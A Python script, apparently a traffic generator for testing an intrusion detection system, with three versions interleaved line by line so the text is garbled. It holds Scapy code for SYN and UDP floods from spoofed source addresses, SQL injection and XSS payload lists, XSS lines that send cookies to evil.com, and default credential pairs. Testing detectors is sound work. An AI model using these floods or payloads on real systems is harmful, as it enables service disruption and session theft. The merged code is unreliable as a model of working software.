#!/usr/bin/env python3#!/usr/bin/env python3#!/usr/bin/env python3

"""

Enhanced Attack Traffic Generator for ML-Enhanced IDS Testing""""""



Improved traffic modes:Enhanced Attack Traffic Generator for ML-Enhanced IDS TestingAdvanced Attack Traffic Generator for ML-Enhanced IDS Testing

- benign: 100% legitimate traffic with realistic patterns

- mixed: 40% benign + 60% attacks (realistic distribution)  

- attacks: 100% malicious traffic for pure attack testing

- flood: Flood of specific attack typeGenerates realistic attack patterns with improved traffic modes:Generates realistic attack patterns matching the Random Forest model's attack types:



Supports comprehensive testing of Suricata rules and ML Adaptive Ensemble.- BENIGN: Normal network traffic with realistic patterns- BENIGN: Normal network traffic

"""

- MIXED: Realistic mix of benign and attack traffic (40% benign, 60% attacks)  - DoS: Denial of Service attacks

import os

import sys- ATTACKS: Attack-only traffic for pure malicious testing (100% attacks)- DDoS: Distributed Denial of Service

import time

import random- FLOOD: Flood of specific attack type- RECONNAISSANCE: Port scans, network probing

import threading

import argparse- BRUTE_FORCE: Authentication attacks

from datetime import datetime

from typing import List, DictAttack Types supported:- BOTNET: Command & control traffic



try:- DoS: Denial of Service attacks- WEB_ATTACK: HTTP-based attacks (SQL injection, XSS, etc.)

    from scapy.all import *

    from scapy.layers.inet import IP, TCP, UDP, ICMP- DDoS: Distributed Denial of Service

    from scapy.layers.dns import DNS, DNSQR

    import ipaddress- RECONNAISSANCE: Port scans, network probingThis allows comprehensive testing of both Suricata rules and ML model inference.

except ImportError as e:

    print(f"Missing Scapy library: {e}")- BRUTE_FORCE: Authentication attacks"""

    print("Install with: pip install scapy")

    sys.exit(1)- BOTNET: Command & control traffic



class Colors:- WEB_ATTACK: HTTP-based attacks (SQL injection, XSS, etc.)import os

    GREEN = '\033[92m'

    YELLOW = '\033[93m'import sys

    RED = '\033[91m'

    BLUE = '\033[94m'This supports comprehensive testing of both Suricata rules and ML model inferenceimport time

    CYAN = '\033[96m'

    BOLD = '\033[1m'with the Adaptive Ensemble (RF2017 + LGB2018) achieving 0.9148 accuracy.import random

    END = '\033[0m'

"""import threading

class EnhancedTrafficGenerator:

    """Enhanced Attack Traffic Generator with improved modes"""import argparse

    

    def __init__(self, interface="enp2s0", target_network="192.168.1.0/24"):import osfrom datetime import datetime

        self.interface = interface

        self.target_network = ipaddress.IPv4Network(target_network)import sysfrom typing import List, Dict, Tuple

        self.source_ips = self._generate_source_ips()

        self.target_ips = list(self.target_network.hosts())[:50]import timeimport json

        

        self.running = Falseimport random

        self.packets_sent = 0

        self.start_time = Noneimport threadingtry:

        self.attack_stats = {

            'BENIGN': 0, 'DoS': 0, 'DDoS': 0, 'RECONNAISSANCE': 0,import argparse    from scapy.all import *

            'BRUTE_FORCE': 0, 'BOTNET': 0, 'WEB_ATTACK': 0

        }from datetime import datetime    from scapy.layers.inet import IP, TCP, UDP, ICMP

        

        # Legitimate domains for benign trafficfrom typing import List, Dict, Tuple    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse

        self.legitimate_domains = [

            "google.com", "youtube.com", "facebook.com", "amazon.com", import json    from scapy.layers.dns import DNS, DNSQR

            "microsoft.com", "github.com", "stackoverflow.com", "netflix.com"

        ]    import ipaddress

        

    def _generate_source_ips(self) -> List[str]:try:except ImportError as e:

        """Generate realistic source IP addresses"""

        ips = []    from scapy.all import *    print(f"Missing Scapy library: {e}")

        

        # Internal IPs for benign traffic    from scapy.layers.inet import IP, TCP, UDP, ICMP    print("Install with: pip install scapy")

        for i in range(10, 250, 5):

            ips.append(f"192.168.1.{i}")    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse    sys.exit(1)

            ips.append(f"10.0.0.{i}")

            from scapy.layers.dns import DNS, DNSQR

        # External attacker IPs

        external_ranges = [    import ipaddressclass Colors:

            "185.220.100.", "103.41.124.", "159.65.200.", "45.33.32."

        ]except ImportError as e:    GREEN = '\033[92m'

        

        for base in external_ranges:    print(f"Missing Scapy library: {e}")    YELLOW = '\033[93m'

            for i in range(1, 255, 10):

                ips.append(f"{base}{i}")    print("Install with: pip install scapy")    RED = '\033[91m'

        

        return ips    sys.exit(1)    BLUE = '\033[94m'

    

    def generate_benign_traffic(self, count: int = 100, rate: float = 10.0):    MAGENTA = '\033[95m'

        """Generate realistic benign network traffic"""

        print(f"{Colors.GREEN}🌐 Generating {count} benign packets at {rate} pps{Colors.END}")class Colors:    CYAN = '\033[96m'

        

        # Time-based rate adjustment    GREEN = '\033[92m'    BOLD = '\033[1m'

        current_hour = datetime.now().hour

        if 9 <= current_hour <= 17:  # Business hours    YELLOW = '\033[93m'    END = '\033[0m'

            rate_multiplier = 1.5

        else:    RED = '\033[91m'

            rate_multiplier = 0.8

            BLUE = '\033[94m'class AdvancedAttackGenerator:

        adjusted_rate = rate * rate_multiplier

            MAGENTA = '\033[95m'    """Generate realistic attack patterns for ML IDS testing"""

        for i in range(count):

            if not self.running:    CYAN = '\033[96m'    

                break

                    BOLD = '\033[1m'    def __init__(self, interface="enp2s0", target_network="192.168.1.0/24"):

            src_ip = random.choice(self.source_ips[:30])  # Internal IPs

            dst_ip = random.choice(self.target_ips[:15])    END = '\033[0m'        self.interface = interface

            

            # Different types of benign traffic        self.target_network = ipaddress.IPv4Network(target_network)

            traffic_type = random.choice(['http', 'https', 'dns', 'ssh', 'email'])

            class EnhancedTrafficGenerator:        self.source_ips = self._generate_source_ips()

            if traffic_type == 'http':

                packet = self._create_http_request(src_ip, dst_ip)    """Enhanced Attack Traffic Generator with improved modes and patterns"""        self.target_ips = list(self.target_network.hosts())[:50]  # Limit targets

            elif traffic_type == 'https':

                packet = IP(src=src_ip, dst=dst_ip)/TCP(            

                    sport=random.randint(1024, 65535), dport=443, flags='S'

                )    def __init__(self, interface="enp2s0", target_network="192.168.1.0/24"):        # Attack configuration

            elif traffic_type == 'dns':

                domain = random.choice(self.legitimate_domains)        self.interface = interface        self.running = False

                packet = IP(src=src_ip, dst="8.8.8.8")/UDP(

                    sport=random.randint(1024, 65535), dport=53        self.target_network = ipaddress.IPv4Network(target_network)        self.packets_sent = 0

                )/DNS(qd=DNSQR(qname=domain))

            elif traffic_type == 'ssh':        self.source_ips = self._generate_source_ips()        self.attack_stats = {

                packet = IP(src=src_ip, dst=dst_ip)/TCP(

                    sport=random.randint(1024, 65535), dport=22, flags='S'        self.target_ips = list(self.target_network.hosts())[:50]  # Limit targets            'BENIGN': 0,

                )

            else:  # email                    'DoS': 0,

                packet = IP(src=src_ip, dst=dst_ip)/TCP(

                    sport=random.randint(1024, 65535), dport=25, flags='S'        # Traffic control            'DDoS': 0,

                )

                    self.running = False            'RECONNAISSANCE': 0,

            try:

                send(packet, iface=self.interface, verbose=0)        self.packets_sent = 0            'BRUTE_FORCE': 0,

                self.packets_sent += 1

                self.attack_stats['BENIGN'] += 1        self.start_time = None            'BOTNET': 0,

                

                if adjusted_rate > 0:        self.attack_stats = {            'WEB_ATTACK': 0

                    delay = (1.0 / adjusted_rate) * random.uniform(0.8, 1.2)

                    time.sleep(delay)            'BENIGN': 0,        }

                    

            except Exception as e:            'DoS': 0,        

                print(f"{Colors.YELLOW}⚠️ Error sending packet: {e}{Colors.END}")

                            'DDoS': 0,        # Web attack payloads

        print(f"{Colors.GREEN}✅ Benign traffic completed: {self.attack_stats['BENIGN']} packets{Colors.END}")

                'RECONNAISSANCE': 0,        self.sql_injection_payloads = [

    def _create_http_request(self, src_ip: str, dst_ip: str):

        """Create realistic HTTP request"""            'BRUTE_FORCE': 0,            "' OR '1'='1",

        sport = random.randint(1024, 65535)

                    'BOTNET': 0,            "' UNION SELECT * FROM users--",

        urls = ["/", "/index.html", "/about", "/contact", "/products"]

        user_agents = [            'WEB_ATTACK': 0            "'; DROP TABLE users; --",

            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",

            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"        }            "' OR 1=1--",

        ]

                            "admin'--",

        url = random.choice(urls)

        user_agent = random.choice(user_agents)        # Enhanced payloads for web attacks            "' OR 'x'='x",

        

        headers = f"GET {url} HTTP/1.1\r\n"        self.sql_injection_payloads = [            "1' OR '1'='1' /*",

        headers += f"Host: {dst_ip}\r\n"

        headers += f"User-Agent: {user_agent}\r\n"            "' OR '1'='1",            "'; EXEC xp_cmdshell('dir'); --"

        headers += "Accept: text/html,application/xhtml+xml\r\n"

        headers += "Connection: keep-alive\r\n\r\n"            "' UNION SELECT * FROM users--",        ]

        

        return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(headers)            "'; DROP TABLE users; --",        

    

    def generate_dos_attack(self, target_ip: str = None, count: int = 1000, rate: float = 100.0):            "' OR 1=1--",        self.xss_payloads = [

        """Generate DoS attack patterns"""

        if not target_ip:            "admin'--",            "<script>alert('XSS')</script>",

            target_ip = random.choice(self.target_ips)

                        "' OR 'x'='x",            "<img src=x onerror=alert('XSS')>",

        print(f"{Colors.RED}💥 DoS Attack: {count} packets → {target_ip} at {rate} pps{Colors.END}")

                    "1' OR '1'='1' /*",            "javascript:alert('XSS')",

        for i in range(count):

            if not self.running:            "'; EXEC xp_cmdshell('dir'); --",            "<svg onload=alert('XSS')>",

                break

                            "' AND (SELECT COUNT(*) FROM users) > 0--",            "<iframe src=javascript:alert('XSS')>",

            src_ip = random.choice(self.source_ips[30:])  # External IPs

            attack_type = random.choice(['syn_flood', 'udp_flood'])            "' UNION SELECT username, password FROM admin--"            "<body onload=alert('XSS')>"

            

            if attack_type == 'syn_flood':        ]        ]

                packet = IP(src=src_ip, dst=target_ip)/TCP(

                    sport=random.randint(1024, 65535),                

                    dport=random.choice([80, 443]),

                    flags='S', seq=random.randint(1, 4294967295)        self.xss_payloads = [        # Botnet C&C domains and patterns

                )

            else:  # udp_flood            "<script>alert('XSS')</script>",        self.botnet_domains = [

                packet = IP(src=src_ip, dst=target_ip)/UDP(

                    sport=random.randint(1024, 65535),            "<img src=x onerror=alert('XSS')>",            "malware-c2.example.com",

                    dport=random.randint(1, 65535)

                )/Raw(RandString(random.randint(64, 512)))            "javascript:alert('XSS')",            "botnet-control.net",

            

            try:            "<svg onload=alert('XSS')>",            "evil-command.org",

                send(packet, iface=self.interface, verbose=0)

                self.packets_sent += 1            "<iframe src=javascript:alert('XSS')>",            "trojan-server.info",

                self.attack_stats['DoS'] += 1

                            "<body onload=alert('XSS')>",            "backdoor-access.biz"

                if rate > 0:

                    time.sleep(1.0 / rate)            "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",        ]

                    

            except Exception as e:            "<img src='http://evil.com/log.php?steal='+document.cookie style='display:none'>"        

                print(f"{Colors.YELLOW}⚠️ Error sending DoS packet: {e}{Colors.END}")

            ]        # Common service ports for reconnaissance

    def generate_mixed_traffic(self, duration: int = 300, total_rate: float = 50.0):

        """Generate mixed traffic with realistic distribution"""                self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 6379, 8080, 8443]

        traffic_mix = {

            'BENIGN': 0.4,         # 40% benign        # Botnet C&C infrastructure        

            'DoS': 0.6,            # 60% attacks (simplified to DoS for this version)

        }        self.botnet_domains = [        # Brute force credentials

        

        return self._execute_traffic_pattern(traffic_mix, duration, total_rate, "Mixed")            "malware-c2.example.com",        self.common_credentials = [

    

    def generate_attack_only_traffic(self, duration: int = 300, total_rate: float = 50.0):            "botnet-control.net",             ("admin", "admin"), ("admin", "password"), ("admin", "123456"),

        """Generate attack-only traffic"""

        attack_mix = {            "evil-command.org",            ("root", "root"), ("root", "password"), ("root", "toor"),

            'BENIGN': 0.0,         # 0% benign

            'DoS': 1.0,            # 100% attacks            "trojan-server.info",            ("user", "user"), ("test", "test"), ("guest", "guest"),

        }

                    "backdoor-access.biz",            ("administrator", "administrator")

        return self._execute_traffic_pattern(attack_mix, duration, total_rate, "Attack-Only")

                "rat-controller.com",        ]

    def generate_benign_only_traffic(self, duration: int = 300, total_rate: float = 50.0):

        """Generate benign-only traffic"""            "zombie-net.org"        

        benign_mix = {

            'BENIGN': 1.0,         # 100% benign        ]    def _generate_source_ips(self) -> List[str]:

            'DoS': 0.0,            # 0% attacks

        }                """Generate realistic source IP addresses"""

        

        return self._execute_traffic_pattern(benign_mix, duration, total_rate, "Benign-Only")        # Common service ports for reconnaissance        ips = []

    

    def _execute_traffic_pattern(self, traffic_mix: Dict[str, float], duration: int,         self.common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 6379, 8080, 8443]        

                                total_rate: float, pattern_name: str):

        """Execute traffic pattern with monitoring"""                # Internal network IPs

        print(f"{Colors.BOLD}{Colors.BLUE}🎯 {pattern_name} Traffic Generation{Colors.END}")

        print(f"Duration: {duration}s, Rate: {total_rate} pps")        # Enhanced brute force credentials        for i in range(10, 250, 5):

        

        self.running = True        self.common_credentials = [            ips.append(f"192.168.1.{i}")

        self.start_time = time.time()

                    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),            ips.append(f"10.0.0.{i}")

        # Calculate packet distribution

        total_packets = int(duration * total_rate)            ("root", "root"), ("root", "password"), ("root", "toor"),        

        packets_per_type = {k: int(v * total_packets) for k, v in traffic_mix.items()}

                    ("user", "user"), ("test", "test"), ("guest", "guest"),        # External attacker IPs (common attack sources)

        print(f"\n{Colors.CYAN}📊 Traffic Distribution:{Colors.END}")

        for attack_type, count in packets_per_type.items():            ("administrator", "administrator"), ("sa", "sa"),        external_ranges = [

            if count > 0:

                percentage = (count / total_packets) * 100            ("oracle", "oracle"), ("mysql", "mysql"), ("postgres", "postgres")            "185.220.100.", "185.220.101.", "185.220.102.",  # Tor exit nodes

                color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED

                print(f"  {color}{attack_type}: {count:,} packets ({percentage:.1f}%){Colors.END}")        ]            "103.41.124.", "103.41.125.",  # VPS providers

        

        # Start traffic generators                    "159.65.200.", "159.65.201.",  # DigitalOcean

        threads = []

                # Legitimate domains for benign traffic            "45.33.32.", "45.33.33.",      # Linode

        if packets_per_type['BENIGN'] > 0:

            t = threading.Thread(target=self.generate_benign_traffic,        self.legitimate_domains = [        ]

                               args=(packets_per_type['BENIGN'], total_rate * traffic_mix['BENIGN']))

            threads.append(('BENIGN', t))            "google.com", "youtube.com", "facebook.com", "amazon.com", "microsoft.com",        

        

        if packets_per_type['DoS'] > 0:            "apple.com", "netflix.com", "github.com", "stackoverflow.com", "linkedin.com",        for base in external_ranges:

            t = threading.Thread(target=self.generate_dos_attack,

                               args=(None, packets_per_type['DoS'], total_rate * traffic_mix['DoS']))            "twitter.com", "reddit.com", "wikipedia.org", "office.com", "zoom.us",            for i in range(1, 255, 10):

            threads.append(('DoS', t))

                    "dropbox.com", "slack.com", "gmail.com", "outlook.com", "salesforce.com"                ips.append(f"{base}{i}")

        # Start threads

        for name, thread in threads:        ]        

            print(f"  Starting {name} generator...")

            thread.start()                return ips

            time.sleep(0.5)

            def _generate_source_ips(self) -> List[str]:    

        # Monitor progress

        monitor_interval = min(30, duration // 10)        """Generate realistic source IP addresses"""    def generate_benign_traffic(self, count: int = 100, rate: float = 10.0):

        while time.time() - self.start_time < duration:

            elapsed = time.time() - self.start_time        ips = []        """Generate realistic, normal network traffic patterns"""

            remaining = duration - elapsed

            rate = self.packets_sent / elapsed if elapsed > 0 else 0                print(f"{Colors.GREEN}🌐 Generating {count} benign packets at {rate} pps{Colors.END}")

            

            print(f"\n{Colors.CYAN}📊 Progress: {elapsed:.1f}s/{duration}s ({remaining:.1f}s left){Colors.END}")        # Internal network IPs (for benign traffic)        

            print(f"  Packets: {self.packets_sent:,} sent ({rate:.1f} pps)")

                    for i in range(10, 250, 5):        # More realistic benign traffic patterns

            time.sleep(monitor_interval)

                    ips.append(f"192.168.1.{i}")        benign_patterns = {

        # Stop traffic generation

        print(f"\n{Colors.YELLOW}⏹️ Stopping {pattern_name} traffic generation...{Colors.END}")            ips.append(f"10.0.0.{i}")            'web_browsing': 0.3,      # 30% - HTTP/HTTPS browsing

        self.running = False

                    ips.append(f"172.16.0.{i}")            'email': 0.15,            # 15% - SMTP/POP3/IMAP

        for name, thread in threads:

            thread.join(timeout=5)                    'dns_queries': 0.2,       # 20% - DNS lookups

        

        self._print_final_stats()        # External attacker IPs (known malicious ranges)            'file_transfer': 0.1,     # 10% - FTP/SFTP

        return True

            external_ranges = [            'remote_access': 0.08,    # 8% - SSH/RDP

    def _print_final_stats(self):

        """Print final statistics"""            "185.220.100.", "185.220.101.", "185.220.102.",  # Tor exit nodes            'media_streaming': 0.12,  # 12% - Video/audio streaming

        elapsed = time.time() - self.start_time if self.start_time else 1

                    "103.41.124.", "103.41.125.",  # Compromised VPS            'office_traffic': 0.05    # 5% - Office365, Google Workspace

        print(f"\n{Colors.BOLD}📊 Traffic Generation Summary{Colors.END}")

        print(f"Total packets: {self.packets_sent:,}")            "159.65.200.", "159.65.201.",  # DigitalOcean abuse        }

        print(f"Duration: {elapsed:.1f} seconds")

        print(f"Average rate: {self.packets_sent/elapsed:.1f} pps")            "45.33.32.", "45.33.33.",      # Linode compromised        

        

        total_attacks = sum(self.attack_stats.values())            "134.195.196.", "134.195.197.", # University networks        # Common legitimate websites and services

        for attack_type, count in self.attack_stats.items():

            if count > 0:        ]        legitimate_domains = [

                percentage = (count / total_attacks) * 100

                color = Colors.GREEN if attack_type == 'BENIGN' else Colors.RED                    "google.com", "youtube.com", "facebook.com", "amazon.com", "microsoft.com",

                print(f"  {color}{attack_type}: {count:,} ({percentage:.1f}%){Colors.END}")

                for base in external_ranges:            "apple.com", "netflix.com", "github.com", "stackoverflow.com", "linkedin.com",

        print(f"\n{Colors.CYAN}🎯 Ready for ML Testing{Colors.END}")

        print("Traffic patterns generated for Adaptive Ensemble (RF2017+LGB2018) testing")            for i in range(1, 255, 10):            "twitter.com", "reddit.com", "wikipedia.org", "office.com", "zoom.us"



def main():                ips.append(f"{base}{i}")        ]

    parser = argparse.ArgumentParser(description="Enhanced Attack Traffic Generator")

    parser.add_argument("--interface", "-i", default="enp2s0", help="Network interface")                

    parser.add_argument("--target-network", "-t", default="192.168.1.0/24", help="Target network")

    parser.add_argument("--mode", "-m", choices=['mixed', 'benign', 'attacks', 'flood'],         return ips        # Office hours simulation (higher activity during business hours)

                       default='mixed', help="Traffic mode")

    parser.add_argument("--duration", "-d", type=int, default=300, help="Duration (seconds)")            current_hour = datetime.now().hour

    parser.add_argument("--rate", "-r", type=float, default=50.0, help="Packet rate (pps)")

    parser.add_argument("--attack-type", "-a",     def generate_benign_traffic(self, count: int = 100, rate: float = 10.0):        if 9 <= current_hour <= 17:  # Business hours

                       choices=['DoS', 'DDoS', 'RECONNAISSANCE', 'BRUTE_FORCE', 'BOTNET', 'WEB_ATTACK'],

                       help="Attack type for flood mode")        """Generate realistic, normal network traffic patterns"""            rate_multiplier = 1.5

    parser.add_argument("--dry-run", action="store_true", help="Show config only")

    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")        print(f"{Colors.GREEN}🌐 Generating {count} benign packets at {rate} pps{Colors.END}")        elif 18 <= current_hour <= 22:  # Evening

    

    args = parser.parse_args()                    rate_multiplier = 1.2

    

    # Validate        # Realistic benign traffic distribution        else:  # Night/early morning

    if args.mode == 'flood' and not args.attack_type:

        print(f"{Colors.RED}❌ --attack-type required for flood mode{Colors.END}")        benign_patterns = {            rate_multiplier = 0.7

        sys.exit(1)

                'web_browsing': 0.35,     # 35% - HTTP/HTTPS browsing        

    # Check root (unless dry-run)

    if not args.dry_run and os.geteuid() != 0:            'email': 0.15,            # 15% - SMTP/POP3/IMAP        adjusted_rate = rate * rate_multiplier

        print(f"{Colors.RED}❌ Root privileges required{Colors.END}")

        print("Run: sudo python3 advanced_attack_generator.py")            'dns_queries': 0.20,      # 20% - DNS lookups        

        sys.exit(1)

                'file_transfer': 0.08,    # 8% - FTP/SFTP        for i in range(count):

    # Display config

    print(f"{Colors.BOLD}🚀 Enhanced Attack Traffic Generator{Colors.END}")            'remote_access': 0.06,    # 6% - SSH/RDP            if not self.running:

    print(f"Mode: {Colors.YELLOW}{args.mode.upper()}{Colors.END}")

    print(f"Interface: {args.interface}")            'media_streaming': 0.12,  # 12% - Video/audio streaming                break

    print(f"Network: {args.target_network}")

    print(f"Duration: {args.duration}s, Rate: {args.rate} pps")            'office_traffic': 0.04    # 4% - Office365, Google Workspace                

    if args.attack_type:

        print(f"Attack Type: {Colors.RED}{args.attack_type}{Colors.END}")        }            # Use internal IPs for benign traffic

    

    if args.dry_run:                    src_ip = random.choice(self.source_ips[:20])

        print(f"\n{Colors.YELLOW}🔍 DRY RUN - Configuration OK!{Colors.END}")

        return        # Time-based traffic simulation            dst_ip = random.choice(self.target_ips[:10])

    

    # Initialize and run        current_hour = datetime.now().hour            

    generator = EnhancedTrafficGenerator(args.interface, args.target_network)

            if 9 <= current_hour <= 17:  # Business hours            # Select traffic pattern based on realistic distribution

    try:

        print(f"\n{Colors.GREEN}🎯 Starting traffic generation...{Colors.END}")            rate_multiplier = 1.5            rand_val = random.random()

        print("Press Ctrl+C to stop")

                elif 18 <= current_hour <= 22:  # Evening            cumulative = 0

        if args.mode == 'mixed':

            generator.generate_mixed_traffic(args.duration, args.rate)            rate_multiplier = 1.2            

        elif args.mode == 'benign':

            generator.generate_benign_only_traffic(args.duration, args.rate)        else:  # Night/early morning            for pattern, probability in benign_patterns.items():

        elif args.mode == 'attacks':

            generator.generate_attack_only_traffic(args.duration, args.rate)            rate_multiplier = 0.7                cumulative += probability

        elif args.mode == 'flood':

            if args.attack_type == 'DoS':                        if rand_val <= cumulative:

                generator.generate_dos_attack(None, int(args.duration * args.rate), args.rate)

            else:        adjusted_rate = rate * rate_multiplier                    traffic_type = pattern

                print(f"Flood mode for {args.attack_type} not implemented in this simplified version")

                                        break

    except KeyboardInterrupt:

        print(f"\n{Colors.YELLOW}⏹️ Stopped by user{Colors.END}")        for i in range(count):            

        generator.running = False

    except Exception as e:            if not self.running:            # Generate specific benign traffic types

        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

        if args.verbose:                break            if traffic_type == 'web_browsing':

            import traceback

            traceback.print_exc()                                if random.random() < 0.7:  # 70% HTTP, 30% HTTPS



if __name__ == "__main__":            # Use internal IPs for benign traffic                    packet = self._create_realistic_http_request(src_ip, dst_ip)

    main()
            src_ip = random.choice(self.source_ips[:30])                else:

            dst_ip = random.choice(self.target_ips[:15])                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                                    sport=random.randint(1024, 65535), 

            # Select traffic pattern                        dport=443, 

            rand_val = random.random()                        flags='S',

            cumulative = 0                        window=random.randint(8192, 65535)

            traffic_type = 'web_browsing'  # default                    )

                                

            for pattern, probability in benign_patterns.items():            elif traffic_type == 'email':

                cumulative += probability                service = random.choice(['smtp', 'pop3', 'imap', 'smtp_auth'])

                if rand_val <= cumulative:                if service == 'smtp':

                    traffic_type = pattern                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                    break                        sport=random.randint(1024, 65535), dport=25, flags='S')

                            elif service == 'pop3':

            # Generate specific benign traffic                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

            packet = self._create_benign_packet(src_ip, dst_ip, traffic_type)                        sport=random.randint(1024, 65535), dport=110, flags='S')

                            elif service == 'imap':

            try:                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                send(packet, iface=self.interface, verbose=0)                        sport=random.randint(1024, 65535), dport=143, flags='S')

                self.packets_sent += 1                else:  # smtp_auth

                self.attack_stats['BENIGN'] += 1                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                                        sport=random.randint(1024, 65535), dport=587, flags='S')

                # Realistic timing with variance                        

                if adjusted_rate > 0:            elif traffic_type == 'dns_queries':

                    base_delay = 1.0 / adjusted_rate                domain = random.choice(legitimate_domains)

                    actual_delay = base_delay * random.uniform(0.8, 1.2)                query_type = random.choice(['A', 'AAAA', 'MX', 'CNAME'])

                    time.sleep(actual_delay)                packet = IP(src=src_ip, dst="8.8.8.8")/UDP(

                                        sport=random.randint(1024, 65535), dport=53

            except Exception as e:                )/DNS(qd=DNSQR(qname=domain, qtype=query_type))

                print(f"{Colors.YELLOW}⚠️ Error sending benign packet: {e}{Colors.END}")                

                            elif traffic_type == 'file_transfer':

        print(f"{Colors.GREEN}✅ Benign traffic completed: {self.attack_stats['BENIGN']} packets{Colors.END}")                if random.random() < 0.6:  # 60% SFTP, 40% FTP

                        packet = IP(src=src_ip, dst=dst_ip)/TCP(

    def _create_benign_packet(self, src_ip: str, dst_ip: str, traffic_type: str):                        sport=random.randint(1024, 65535), dport=22, flags='S')

        """Create specific benign packet types"""                else:

        sport = random.randint(1024, 65535)                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                                sport=random.randint(1024, 65535), dport=21, flags='S')

        if traffic_type == 'web_browsing':                        

            if random.random() < 0.7:  # 70% HTTP, 30% HTTPS            elif traffic_type == 'remote_access':

                return self._create_realistic_http_request(src_ip, dst_ip)                if random.random() < 0.8:  # 80% SSH, 20% RDP

            else:                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                return IP(src=src_ip, dst=dst_ip)/TCP(                        sport=random.randint(1024, 65535), dport=22, flags='S')

                    sport=sport, dport=443, flags='S',                else:

                    window=random.randint(8192, 65535)                    packet = IP(src=src_ip, dst=dst_ip)/TCP(

                )                        sport=random.randint(1024, 65535), dport=3389, flags='S')

                                        

        elif traffic_type == 'email':            elif traffic_type == 'media_streaming':

            service = random.choice(['smtp', 'pop3', 'imap', 'smtp_tls'])                # Simulate streaming traffic with larger packets

            port_map = {'smtp': 25, 'pop3': 110, 'imap': 143, 'smtp_tls': 587}                streaming_ports = [1935, 8080, 8443, 554]  # RTMP, HTTP streaming, RTSP

            return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=port_map[service], flags='S')                packet = IP(src=src_ip, dst=dst_ip)/UDP(

                                sport=random.randint(1024, 65535), 

        elif traffic_type == 'dns_queries':                    dport=random.choice(streaming_ports)

            domain = random.choice(self.legitimate_domains)                )/Raw(RandString(random.randint(1200, 1400)))  # Larger streaming packets

            query_type = random.choice(['A', 'AAAA', 'MX', 'CNAME'])                

            return IP(src=src_ip, dst="8.8.8.8")/UDP(sport=sport, dport=53)/DNS(qd=DNSQR(qname=domain, qtype=query_type))            else:  # office_traffic

                            # Office 365, Google Workspace traffic

        elif traffic_type == 'file_transfer':                office_ports = [443, 993, 995, 587, 25]

            port = 22 if random.random() < 0.8 else 21  # 80% SFTP, 20% FTP                packet = IP(src=src_ip, dst=dst_ip)/TCP(

            return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=port, flags='S')                    sport=random.randint(1024, 65535), 

                                dport=random.choice(office_ports), 

        elif traffic_type == 'remote_access':                    flags='S'

            port = 22 if random.random() < 0.85 else 3389  # 85% SSH, 15% RDP                )

            return IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=port, flags='S')            

                        try:

        elif traffic_type == 'media_streaming':                send(packet, iface=self.interface, verbose=0)

            streaming_ports = [1935, 8080, 8443, 554]                self.packets_sent += 1

            return IP(src=src_ip, dst=dst_ip)/UDP(                self.attack_stats['BENIGN'] += 1

                sport=sport, dport=random.choice(streaming_ports)                

            )/Raw(RandString(random.randint(1200, 1400)))                # Realistic inter-packet timing with some variance

                            if adjusted_rate > 0:

        else:  # office_traffic                    base_delay = 1.0 / adjusted_rate

            office_ports = [443, 993, 995, 587]                    # Add 20% variance to make it more realistic

            return IP(src=src_ip, dst=dst_ip)/TCP(                    actual_delay = base_delay * random.uniform(0.8, 1.2)

                sport=sport, dport=random.choice(office_ports), flags='S'                    time.sleep(actual_delay)

            )                    

                except Exception as e:

    def _create_realistic_http_request(self, src_ip: str, dst_ip: str):                print(f"{Colors.YELLOW}⚠️ Error sending benign packet: {e}{Colors.END}")

        """Create realistic HTTP request with proper headers"""                

        sport = random.randint(1024, 65535)        print(f"{Colors.GREEN}✅ Benign traffic generation completed: {self.attack_stats['BENIGN']} packets{Colors.END}")

            

        benign_urls = [    def _create_realistic_http_request(self, src_ip: str, dst_ip: str) -> Packet:

            "/", "/index.html", "/home", "/about", "/contact", "/products",        """Create realistic HTTP request with proper headers and user agents"""

            "/services", "/news", "/blog", "/static/css/style.css",         sport = random.randint(1024, 65535)

            "/static/js/main.js", "/api/v1/users", "/search?q=python+tutorial",        

            "/images/logo.png", "/favicon.ico", "/robots.txt"        # Realistic URLs for benign traffic

        ]        benign_urls = [

                    "/", "/index.html", "/home", "/about", "/contact", 

        user_agents = [            "/products", "/services", "/news", "/blog", 

            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",            "/static/css/style.css", "/static/js/main.js",

            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",            "/api/v1/users", "/search?q=python+tutorial",

            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",            "/images/logo.png", "/favicon.ico"

            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"        ]

        ]        

                # Realistic user agents

        url = random.choice(benign_urls)        user_agents = [

        user_agent = random.choice(user_agents)            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",

